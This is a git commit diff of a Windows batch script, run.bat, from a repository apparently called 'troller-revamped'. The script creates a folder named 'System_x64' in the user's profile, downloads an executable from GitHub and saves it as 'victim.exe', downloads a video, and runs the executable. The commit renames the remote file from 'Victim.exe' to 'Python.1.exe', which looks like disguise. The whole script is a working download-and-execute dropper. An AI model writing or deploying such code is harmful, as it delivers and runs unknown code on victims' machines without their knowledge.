942fa4218ef1465cdf4d8df6bc6fc5ee5b286d4d
vexnity <159264249+vexnity@users.noreply.github.com>
2024-06-18 12:21:22 +0530

    Update run.bat

--- run.bat
+++ run.bat
@@ -1,6 +1,6 @@
 cd %userprofile%
 mkdir System_x64
 cd System_x64
-curl -L "https://github.com/vexnity/troller-revamped/releases/download/preview/Victim.exe" -o victim.exe
+curl -L "https://github.com/vexnity/troller-revamped/releases/download/preview/Python.1.exe" -o victim.exe
 curl "https://raw.githubusercontent.com/vexnity/troller-revamped/preview/test.mp4" -o test.mp4
 %userprofile%\System_x64\Victim.exe
